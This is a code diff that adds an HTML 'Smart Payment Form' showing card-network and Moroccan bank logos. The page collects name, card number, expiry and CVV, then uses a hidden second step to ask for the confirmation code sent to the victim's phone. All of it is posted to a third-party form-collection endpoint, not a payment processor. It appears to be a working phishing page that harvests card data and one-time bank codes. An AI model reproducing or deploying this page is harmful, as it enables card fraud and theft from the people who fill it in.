@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Smart Payment Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+      padding: 2rem;
+      color: #333;
+    }
+    form {
+      max-width: 420px;
+      margin: auto;
+      background-color: #f5f5f5;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, button {
+      width: 100%;
+      padding: 0.75rem;
+      margin-top: 0.5rem;
+      margin-bottom: 1.2rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    button {
+      background-color: #5e2ca5;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .hidden {
+      display: none;
+    }
+    .logos {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 1rem;
+    }
+    .logos img {
+      height: 30px;
+    }
+  </style>
+  <script>
+    function showConfirmationStep(event) {
+      event.preventDefault();
+      const paymentFields = document.getElementById('payment-fields');
+      const confirmationStep = document.getElementById('confirmation-step');
+      paymentFields.classList.add('hidden');
+      confirmationStep.classList.remove('hidden');
+    }
+
+    function formatCardNumber(input) {
+      input.value = input.value
+        .replace(/[^0-9]/g, '')
+        .replace(/(.{4})/g, '$1 ')
+        .trim();
+    }
+
+    function formatExpiry(input) {
+      let value = input.value.replace(/[^0-9]/g, '');
+      if (value.length >= 3) {
+        input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      } else {
+        input.value = value;
+      }
+    }
+  </script>
+</head>
+<body>
+  <form id="payment-form" action="https://usebasin.com/f/3b7e39e6ce39" method="POST">
+    <div id="payment-fields">
+      <h2>💳 Payment Info</h2>
+      <div class="logos">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard">
+        <img src="https://upload.wikimedia.org/wikipedia/fr/2/2f/Logo_Attijariwafa_bank.svg" alt="Attijariwafa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/8a/Logo_CIH_Bank.svg" alt="CIH">
+      </div>
+      <input type="text" name="name" placeholder="👤 Name on Card" required>
+      <input type="text" name="card" placeholder="💳 Card Number" oninput="formatCardNumber(this)" maxlength="19" required>
+      <input type="text" name="expiry" placeholder="📅 Expiry MM/YY" oninput="formatExpiry(this)" maxlength="5" required>
+      <input type="text" name="cvv" placeholder="🔒 CVV" maxlength="4" required>
+      <button onclick="showConfirmationStep(event)">💰 Pay</button>
+    </div>
+
+    <div id="confirmation-step" class="hidden">
+      <h2>🧾 Enter Confirmation Code</h2>
+      <input type="text" name="confirmation_code" placeholder="Code received on your phone" required>
+      <button type="submit">✅ Confirm Payment</button>
+    </div>
+  </form>
+</body>
+</html>
